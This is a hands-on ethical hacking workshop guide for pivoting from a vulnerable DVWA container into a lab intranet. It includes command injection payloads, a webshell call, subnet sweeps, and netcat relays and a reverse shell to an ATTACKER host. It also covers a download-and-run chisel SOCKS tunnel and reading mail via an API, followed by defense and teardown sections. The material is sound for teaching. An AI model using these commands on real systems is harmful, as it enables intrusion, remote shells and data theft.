# Pivoting & Lateral Movement in the CyberRange

# Warning
This workshop is for educational purposes only, as part of WOCSA ethical hacking workshops. All techniques described here target the intentionally vulnerable CyberRange environment. Never use them against systems you do not own or do not have explicit written permission to test.

# Table of Contents
- [Pivoting & Lateral Movement in the CyberRange](#pivoting--lateral-movement-in-the-cyberrange)
- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [How the lab runs on the day](#how-the-lab-runs-on-the-day)
- [Prerequisites](#prerequisites)
- [Lab topology recap](#lab-topology-recap)
- [Phase 1 - Foothold on DVWA](#phase-1---foothold-on-dvwa)
- [Phase 2 - Enumeration from the foothold](#phase-2---enumeration-from-the-foothold)
- [Phase 3 - Pivoting techniques](#phase-3---pivoting-techniques)
  - [Pivot 1: HTTP relay via DVWA (curl only)](#pivot-1-http-relay-via-dvwa-curl-only)
  - [Pivot 2: Reverse shell relayed through DVWA with netcat](#pivot-2-reverse-shell-relayed-through-dvwa-with-netcat)
  - [Pivot 3: Full dynamic SOCKS pivot](#pivot-3-full-dynamic-socks-pivot)
  - [Pivot 4: Mint your own VPN peer (become an employee)](#pivot-4-mint-your-own-vpn-peer-become-an-employee)
- [Phase 4 - Lateral movement goals](#phase-4---lateral-movement-goals)
- [Defense & detection](#defense--detection)
- [Takeaways checklist](#takeaways-checklist)
- [Resources](#resources)
- [Summary report](#summary-report)

# Introduction
Pivoting is the art of using a compromised machine as a stepping stone to reach networks that are not directly accessible from your attacker position. It sits right in the middle of the kill chain: after **initial foothold** and before **lateral movement / actions on objectives**. In a segmented enterprise, the web server you pwned almost never holds the crown jewels - but it is often the only machine with a foot in both the DMZ and the internal network.

The canonical story of the CyberRange is exactly that: **pwn DVWA from the outside -> pivot to the intranet -> own metasploitable2 / the workstations -> read the company mail**. Every other DMZ service stops at the DMZ boundary (Docker drops inter-bridge traffic), which is what a properly segmented network should do. DVWA, with its extra "misconfigured" network leg, fails to do it - and that makes it the star of this workshop.

# How the lab runs on the day
On workshop day there is **no Docker on the participant side**. The instructor spins the whole CyberRange up on a single server, and you take part as a **remote attacker** reaching that server over the network. That changes how every command is delivered:

- `SERVER` = the CyberRange server address the instructor gives you (an IP or hostname). The only thing you can reach directly is the **published DMZ ports** on `SERVER` - above all DVWA on `SERVER:8081`. The intranet (`10.5.20.0/24`) is **not** routable from your seat.
- `ATTACKER` = your own machine's address. The lab network is set up so the server can also reach back to you, which is what makes the reverse shell and reverse SOCKS pivots work.
- **Two kinds of command run in this guide, and they are tagged:**
  - **`[attacker]`** - runs on *your own machine* (your laptop or lab VM): `curl`, `nc`, `chisel`, `proxychains`, a browser.
  - **`[DVWA]`** - runs *on DVWA*, but you never use `docker exec`. You deliver it through **DVWA's web command channel**: paste it after `127.0.0.1;` in the low-security **Command Injection** box, or call it from a PHP webshell you uploaded. The output comes back in the HTTP response.
- **`[operator]`** steps use shell/Docker access **on the server itself**. They are for the **instructor / blue team**, not the participants, and are only shown so the defender can verify the setup. You do not need them to complete the attack.

That is the whole trick of the day: a remote attacker with only `SERVER:8081` in reach turns DVWA into a doorway onto a network they were never supposed to touch.

# Prerequisites
On your own machine (`[attacker]`):
- `curl`, OpenBSD `nc`, and Python 3.
- [Chisel](https://github.com/jpillora/chisel/releases) for Pivot 3 - two binaries: one for **your** OS/CPU, one for **DVWA's** Linux CPU. Unpack them before the session (details in Pivot 3).
- `proxychains` (`proxychains4`) if you want to run TCP tools through the SOCKS pivot.
- A browser you can point at a SOCKS5 proxy.
- The **`SERVER` address** from the instructor, and confirmation that **DVWA answers at `http://SERVER:8081`**.

Instructor only (`[operator]`, on the server):
- Start the range: `cd CyberRange && docker compose up -d` (profiles `dmz` + `intranet` + `vpn`; options in `CyberRange/README.md`).
- Make sure the DMZ ports (DVWA `:8081`, etc.) are published/reachable by participants, and that the server can route back to participant machines for the reverse pivots.
- A VPN peer is the "legitimate" way in (admin UI `http://SERVER:51821`, credentials in `CyberRange/.env`); useful only to compare against the attack paths below.

## Instructor setup and repeatable checks
*(`[operator]` - on the server. Participants can skip this section.)*

Allow about 90 minutes: setup/foothold 20, enumeration 15, relays/SOCKS 35, defense and cleanup 20. A Linux Docker host can often reach bridge addresses directly; participants coming over the network cannot, which is exactly the isolation you want to demonstrate. Start only the core targets (DVWA's database starts as a dependency):
```bash
docker compose --env-file CyberRange/.env.example -f CyberRange/docker-compose.yml up -d corporate-site dvwa intranet-wiki metasploitable2
# Confirm DVWA is tri-homed (all three legs appear):
docker inspect cyberrange-dvwa | grep -E "10\.5\.(10|15|20)\."
# Confirm DVWA reaches the intranet wiki, and a DMZ-only box does not:
docker exec cyberrange-dvwa curl -s -o /dev/null -w "dvwa->wiki=%{http_code}\n" --max-time 5 http://10.5.20.10/
docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.20.10/ ; echo "dmz-only exit=$? (non-zero = isolated, expected)"
```
The sample environment suffices for the local core lab. For shared hosting, copy it to `CyberRange/.env`, configure the bind address and credentials, and use that file instead. Older target images may require amd64 emulation on ARM hosts. Wait for services to finish booting before testing. Initialize DVWA through `/setup.php`; do not reset a shared database without coordinating with the class.

These checks use operator access on the server and are bounded and non-destructive: they verify the core topology and HTTP/TCP access, not completion of the interactive exercises. Optional VPN, monitoring, mail and desktop goals require those services to be started separately.

Stop only these workshop services when finished (preserves data):
```bash
docker compose --env-file CyberRange/.env.example -f CyberRange/docker-compose.yml stop corporate-site dvwa dvwa-db intranet-wiki metasploitable2
```

# Lab topology recap
The range is split into three Docker networks. DVWA is the **only** service with a leg in all three.

| Zone | Subnet | Hosts | Reachability |
|---|---|---|---|
| DMZ | `10.5.10.0/24` | corporate-site `.10`, juice-shop `.11`, dvwa `.12`, mailpit `.13` | published on `SERVER` ports, no VPN needed |
| DB tier | `10.5.15.0/24` | dvwa-db `.10`, dvwa `.20` | DVWA only (dvwa-db:3306) |
| Intranet | `10.5.20.0/24` | wg-easy `.2`, dokuwiki `.10`, sftpgo `.11`, metasploitable2 `.12`, grafana `.14`, prometheus `.15`, blackbox `.16`, dvwa `.20`, workstations `.21`/`.22` | VPN only - except for DVWA's third leg |

Expected reachability from your remote seat:
- **From your machine (`[attacker]`)**: only the published DMZ ports on `SERVER` answer. `10.5.20.x` and `10.5.15.x` are **not** routable - try `curl --max-time 3 http://SERVER` style probes and the intranet simply times out. That dead end is the point.
- **From DVWA (`[DVWA]`)**: the whole intranet is reachable - `10.5.20.10` (HTTP 200), `10.5.20.12` (many open ports), `10.5.20.2:51821` (401 unauth = reachable). DVWA is your bridge across that gap.
- Check which tools DVWA has before relying on them - run through the web command channel: `127.0.0.1; command -v nc; command -v curl; command -v python3; command -v php`. PHP is sufficient for enumeration; Python and netcat availability depends on the image.
- Two documented exceptions worth knowing (see `CyberRange/README.md`): blackbox-exporter is dual-homed (`10.5.10.20:9115`, abusable `/probe` endpoint). Grafana provisions a wg-easy authorization header in `secureJsonData`; this is not a plaintext credential disclosure through its UI. Mailpit has no authentication configured here.

# Phase 1 - Foothold on DVWA
1. In your browser, open `http://SERVER:8081` and log in with `admin` / `password`.
2. On a **first run** (fresh database), the login redirects to `/setup.php`: click **"Create / Reset Database"** once, then log in again.
3. `DVWA_SECURITY_LEVEL=low` is the default - keep it for this workshop.
4. Get command execution on DVWA through the web. This is your **`[DVWA]` command channel** for the rest of the lab - no shell on the server needed:
   - **Command Injection** module, low security - type an IP followed by the command you want:
     ```
     127.0.0.1; id
     127.0.0.1; hostname -I
     ```
     The command's output is rendered back on the page.
   - **or** upload a small PHP webshell through the **File Upload** module and call it from `/hackable/uploads/`, e.g. `http://SERVER:8081/hackable/uploads/shell.php?cmd=id`.

From here on, wherever a command is tagged **`[DVWA]`**, run it through this channel: paste it after `127.0.0.1;` in the Command Injection box, or pass it as the `cmd` parameter of your webshell. The identity you get is the web account (typically `www-data`) - that is enough for every pivot below.

# Phase 2 - Enumeration from the foothold
First, prove DVWA is tri-homed - from the web command channel:
```
[DVWA]  127.0.0.1; hostname -I
```
You should see all three legs: `10.5.10.12` (DMZ), `10.5.15.20` (db-tier), `10.5.20.20` (intranet). That one line is the whole justification for the pivot: this box can see a network you cannot.

There is no `nmap`/`arp-scan` inside DVWA, but `php` and `python3` usually are. Find live hosts on `10.5.20.0/24` by testing port 80, straight from the web command channel:

PHP one-liner (paste after `127.0.0.1;` in Command Injection):
```
[DVWA]  127.0.0.1; php -r 'for($i=1;$i<255;$i++){ $f=@fsockopen("10.5.20.$i",80,$e,$s,0.1); if($f){ echo "10.5.20.$i port 80 OPEN\n"; fclose($f);} }'
```

Python3 alternative (same channel, through your webshell):
```
[DVWA]  127.0.0.1; python3 -c "
import socket
for i in range(1,255):
    ip = '10.5.20.%d' % i
    s = socket.socket(); s.settimeout(0.2)
    if s.connect_ex((ip,80)) == 0: print(ip, '80 open')
    s.close()
"
```
Expect at least `.10` (dokuwiki), `.12` (metasploitable2 Apache) and `.20` (yourself). Then probe a few known ports (`.2:51821`, `.11:8080`, `.12` full sweep with a port list, `.14:3000`) the same way.

# Phase 3 - Pivoting techniques

## Pivot 1: HTTP relay via DVWA (curl only)
The simplest pivot: make DVWA run `curl` for you. No special tooling, no extra connection - every request is one more command through the web channel you already have, and the response comes back on the DVWA page.

```
# Wiki (dokuwiki) - first run shows the install wizard
[DVWA]  127.0.0.1; curl -s -I http://10.5.20.10/
[DVWA]  127.0.0.1; curl -s http://10.5.20.10/install.php | head -20

# Metasploitable2 web roots
[DVWA]  127.0.0.1; curl -s -I http://10.5.20.12/
[DVWA]  127.0.0.1; curl -s -I http://10.5.20.12:8180/

# wg-easy admin UI is reachable (401 = alive, needs auth)
[DVWA]  127.0.0.1; curl -s -o /dev/null -w "%{http_code}\n" http://10.5.20.2:51821/

# sftpgo web UI
[DVWA]  127.0.0.1; curl -s -o /dev/null -w "%{http_code}\n" http://10.5.20.11:8080/
```
Notes:
- `10.5.20.10/install.php` means the wiki has never been configured: run the wizard (through the VPN, or by replaying the POSTs from DVWA's curl) and it becomes an internal knowledge base - a goldmine of employee notes.
- This pivot is "static": every request is one curl invocation driven from the web page. Fine for enumeration and data theft, useless for interactive shells. The next pivots solve that.

## Pivot 2: Reverse shell relayed through DVWA with netcat
Metasploitable2 has no published ports, so you cannot touch it from your seat - but DVWA can, and it can also reach back to you. Use tri-homed DVWA as the middle box to bridge metasploitable2's root bindshell (TCP `1524`) out to a listener on your machine. Commands below use OpenBSD netcat syntax; the listener on macOS also accepts `nc -l 4445`.

1. **`[attacker]`** On your machine, listen:
   ```bash
   nc -lvnp 4445
   ```
2. **`[DVWA]`** Through the web command channel, start a backgrounded bidirectional relay. It dials out to **your** listener and to metasploitable2's bindshell, and shuttles bytes between them (replace `ATTACKER` with your machine's address):
   ```
   127.0.0.1; (rm -f /tmp/p; mkfifo /tmp/p; nc 10.5.20.12 1524 </tmp/p | nc ATTACKER 4445 >/tmp/p) &
   ```
3. **`[attacker]`** Back in your listener, type `id`. Expect `uid=0(root)` - a root shell on an internal host, reached from outside with nothing but a web bug on DVWA. Type `exit` and Ctrl-C the listener when done; clean the relay with `[DVWA] 127.0.0.1; pkill -f /tmp/p; rm -f /tmp/p`.

Why it works: the `nc ... | nc ...` pair plus the FIFO forms a two-way bridge. One direction alone (a single `nc | nc`) only forwards one way and cannot carry an interactive shell. Metasploitable2's `1524` bindshell is already a shell, so no `-e` is needed on DVWA's netcat (OpenBSD `nc` does not have `-e` anyway). If a target instead needs to *connect back*, the same idea applies: have it run `nc ATTACKER 4445 -e /bin/sh` and catch it directly.

## Pivot 3: Full dynamic SOCKS pivot
A reverse SOCKS tunnel lets the TCP clients on **your** machine reach internal services through DVWA without a VPN. DVWA opens the tunnel *outbound* to you, so nothing new has to be published on the server.

Obtain matching [Chisel release binaries](https://github.com/jpillora/chisel/releases) for your machine's OS/CPU and DVWA's Linux CPU (find DVWA's arch with `[DVWA] 127.0.0.1; uname -m`). Unpack them before the session; an amd64 container needs the linux_amd64 binary even on an ARM laptop. Name your local binary `chisel` and the Linux one `chisel-linux`.

1. **`[attacker]`** Serve the Linux binary so DVWA can fetch it, and start the chisel server:
   ```bash
   # in the folder holding chisel-linux
   python3 -m http.server 8000 &
   chmod +x ./chisel
   ./chisel server --reverse --port 8082 --auth workshop:lab-only
   ```
2. **`[DVWA]`** Pull the binary onto DVWA and launch the reverse client, backgrounded (replace `ATTACKER`):
   ```
   127.0.0.1; curl -s http://ATTACKER:8000/chisel-linux -o /tmp/chisel; chmod +x /tmp/chisel
   127.0.0.1; /tmp/chisel client --auth workshop:lab-only http://ATTACKER:8082 R:127.0.0.1:1080:socks >/tmp/chisel.log 2>&1 &
   ```
   (No File Upload needed, but you can also deliver the binary through DVWA's **File Upload** module instead of the `curl` fetch.)
3. **`[attacker]`** A SOCKS5 proxy is now live on your `127.0.0.1:1080`. Reach the whole intranet through it:
   ```bash
   curl --noproxy '' --socks5-hostname 127.0.0.1:1080 --max-time 10 http://10.5.20.10/
   ```
   Expect the wiki HTML or an installation redirect. Point your browser at SOCKS5 `127.0.0.1:1080` to explore the internal web services. For proxychains, configure `socks5 127.0.0.1 1080`; a bounded scan is `proxychains4 nmap -sT -Pn -n -p 80,22 10.5.20.12`. SOCKS carries TCP only - no raw SYN scans or ICMP discovery.

Tear down afterwards: stop the chisel client and server, stop the `http.server`, and remove the binary with `[DVWA] 127.0.0.1; pkill -f /tmp/chisel; rm -f /tmp/chisel /tmp/chisel.log`.

SSH `-D` is an alternative only after an SSH endpoint is reachable. A direct `ssh -D ... 10.5.20.12` from your seat cannot establish the first pivot - the host is not routable until the tunnel exists. SFTPGo is a file transfer service, not a general SSH shell/tunneling server.

## Pivot 4: Mint your own VPN peer (become an employee)
This is an optional instructor-assisted comparison, not a required exploitation step. The instructor starts the VPN service and issues an admin credential; you browse `http://10.5.20.2:51821` **through the SOCKS browser from Pivot 3** (it is an intranet host). Log in, create a temporary `pivot-proof` peer, download its configuration, then activate it in WireGuard. The VPN endpoint must point to the reachable lab server and its UDP port must be accessible. Confirm intranet access, disconnect, then delete the temporary peer and local configuration.

Do not assume wg-easy v15 accepts Basic authentication on `/api/client`, or that Grafana reveals its encrypted `secureJsonData` values. Use the deployed version's UI and verify its API before automating it. Reading `CyberRange/.env` is an `[operator]` credential handoff on the server, not an attacker discovery. The sample environment has a known training password; change it for a shared session.

# Phase 4 - Lateral movement goals
Choose your own adventure, all from the pivoted position:
- **Own metasploitable2** (`10.5.20.12`): `msfadmin` / `msfadmin` over SSH or telnet (reach them through the SOCKS pivot with `proxychains`); or the famous root bindshell on port `1524`, which you can hit straight from the web channel:
  ```
  [DVWA]  127.0.0.1; printf "id\nexit\n" | nc -w 3 10.5.20.12 1524
  ```
  Then enumerate its many services (21, 22, 23, 25, 111, 139, 445, 512-514, 1099, 2121, 3306, 3632, 5432, 6667, 6697, 8009, 8180, 8787) for more practice - through `proxychains` from your machine, or more `[DVWA]` curl/nc probes.
- **Inspect the optional workstations** through the SOCKS browser (`https://10.5.20.21:3001`, `https://10.5.20.22:3001`). These use self-signed certificates. The Compose configuration does not set desktop credentials; VPN credentials are not desktop credentials.
- **Read the company mail** (mailpit, reachable from DVWA on the DMZ leg):
  ```
  [DVWA]  127.0.0.1; curl -s http://10.5.10.13:8025/api/v1/messages
  [DVWA]  127.0.0.1; curl -s 'http://10.5.10.13:8025/api/v1/message/REPLACE_WITH_ID/raw'
  ```

# Defense & detection
- **The remote-attacker view is itself the lesson**: from a participant seat, `10.5.20.x` is unreachable - every direct probe times out. The intranet only becomes reachable *through* DVWA, because someone gave DVWA a third network leg. Pair that dead end with the successful `[DVWA]` reach to make the point concrete.
- **Verify segmentation against listening services** (`[operator]`, on the server): pair a negative check from a DMZ-only box with a positive one from DVWA. For a manual wiki check:
  ```bash
  docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.20.10/ ; echo "exit=$?"
  ```
  This should fail while the same request from DVWA succeeds. Test the database on TCP 3306, not HTTP port 80 (which is closed even without isolation). This is the single most important lesson: DVWA is reachable *because* someone gave it three legs.
- **Least privilege network legs**: DMZ apps need a DMZ leg, not an intranet one. Databases need a private tier reachable only by their application. Review every container's networks like a firewall rule.
- **Detection limits**: the bundled Prometheus/blackbox dashboards show service health, not connection histories or peer-creation audit events. To investigate a pivot, collect application logs and packet captures on the relevant interfaces (the relay and tunnel connections above all originate from DVWA). Record source/destination addresses and timestamps during the exercise.
- **Patch and segment DVWA**: it is intentionally vulnerable (low security level, command injection, file upload) - in production it should be patched, hardened, and, above all, stripped of its intranet leg.

# Takeaways checklist
- [ ] Logged into DVWA at `SERVER:8081` (`admin`/`password`), ran setup.php on first boot
- [ ] Got a `[DVWA]` command channel through Command Injection (or an uploaded webshell)
- [ ] Confirmed DVWA's three legs with `hostname -I` over that channel
- [ ] Enumerated `10.5.20.0/24` from DVWA with the php/python3 port-80 sweep
- [ ] Reached the wiki (`10.5.20.10`), metasploitable2 (`10.5.20.12`) and wg-easy (`10.5.20.2:51821`) through the curl relay
- [ ] Caught a metasploitable2 root shell on your own listener through the DVWA nc relay
- [ ] Set up a reverse Chisel SOCKS pivot on DVWA and browsed the intranet with `proxychains`
- [ ] Optionally created and deleted a WireGuard peer through the UI with instructor credentials
- [ ] Confirmed that the intranet is unreachable directly from your seat (only through DVWA)
- [ ] Read company mail through the mailpit API
- [ ] Tore down listeners, tunnels and the staged `/tmp/chisel` binary

# Resources
- [wg-easy documentation & API](https://github.com/wg-easy/wg-easy)
- [CyberRange README (topology, profiles, isolation rules)](../../CyberRange/README.md)
- [PayloadsAllTheThings - Network Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
- [Chisel (fast TCP/UDP tunnel over HTTP)](https://github.com/jpillora/chisel)
- [proxychains](https://github.com/haad/proxychains)
- [Metasploitable2 guide](https://docs.rapid7.com/metasploitable/)

# Summary report
Record what you actually verified: image versions, attacker location (your remote seat), foothold identity, reachable ports, a command/response through the web channel, a SOCKS HTTP response, and the positive/negative isolation checks (intranet unreachable from your seat, reachable through DVWA). Distinguish `[operator]` setup/verification from the `[attacker]`/`[DVWA]` exploitation path. Record optional exercises skipped and remove temporary binaries, listeners and VPN peers.
